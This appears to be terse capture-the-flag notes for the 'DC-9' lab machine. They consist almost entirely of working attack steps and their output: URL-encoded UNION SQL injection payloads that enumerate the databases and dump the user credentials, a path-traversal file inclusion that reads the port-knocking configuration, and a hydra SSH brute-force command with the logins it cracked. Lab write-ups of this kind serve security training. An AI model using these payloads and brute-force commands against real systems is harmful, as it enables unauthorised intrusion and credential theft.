### DC-9

#### SQLI

databases => search=adm'+union+select+1,1,1,1,1,(gRoUp_cOncaT(0x7c,schema_name,0x7c))+from+information_schema.schemata+--+-

|information_schema|,|Staff|,|users|

usually generic data in information_schema, lets look in users

search=adm'+union+select+1,1,1,1,1,(gRoUp_cOncaT(0x7c,table_name,0x7c))+from+information_schema.tables+where+table_schema='users'+--+-
|UserDetails|

search=adm'+union+select+1,1,1,1,1,(gRoUp_cOncaT(0x7c,column_name,0x7c))+from+information_schema.columns+where+table_name='UserDetails'+--+-
|id|,|firstname|,|lastname|,|username|,|password|,|reg_date|


Usernames and Passwords

search=adm'+union+select+1,1,1,1,1,(gRoUp_cOncaT(username))+from+users.UserDetails+--+-
```
marym
julied
fredf
barneyr
tomc
jerrym
wilmaf
bettyr
chandlerb
joeyt
rachelg
rossg
monicag
phoebeb
scoots
janitor
janitor2
```

search=adm'+union+select+1,1,1,1,1,(gRoUp_cOncaT(0x7c,password,0x7c))+from+users.UserDetails+--+-

```
3kfs86sfd
468sfdfsd2
4sfd87sfd1
RocksOff
TC&TheBoyz
B8m#48sd
Pebbles
BamBam01
UrAG0D!
Passw0rd
yN72#dsd
ILoveRachel
3248dsds7s
smellycats
YR3BVxxxw87
Ilovepeepee
Hawaii-Five-0
transorbital
```

search=adm'+union+select+1,1,1,1,1,(gRoUp_cOncaT(0x7c,table_name,0x7c))+from+information_schema.tables+where+table_schema='Staff'+--+-
|StaffDetails|,|Users|

search=adm'+union+select+1,1,1,1,1,(gRoUp_cOncaT(0x7c,column_name,0x7c))+from+information_schema.columns+where+table_name='Users'+--+-
|UserID|,|Username|,|Password|

search=search=adm'+union+select+1,1,1,1,1,(gRoUp_cOncaT(0x7c,Password,0x7c))+from+Staff.Users+--+-
856f5de590ef37314e7c3bdf6f8a66dc => transorbital

#### LFI

/welcome.php?file=../../../../../etc/knockd.conf

```
[openSSH]
	sequence    = 7469,8475,9842
	seq_timeout = 25
	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn

[closeSSH]
	sequence    = 9842,8475,7469
	seq_timeout = 25
	command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn
```

#### SSH

hydra -L users -P pass ssh://172.22.222.4

```
[22][ssh] host: 172.22.222.4   login: chandlerb   password: UrAG0D!
[22][ssh] host: 172.22.222.4   login: joeyt   password: Passw0rd
[22][ssh] host: 172.22.222.4   login: janitor   password: Ilovepeepee
```

```
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
```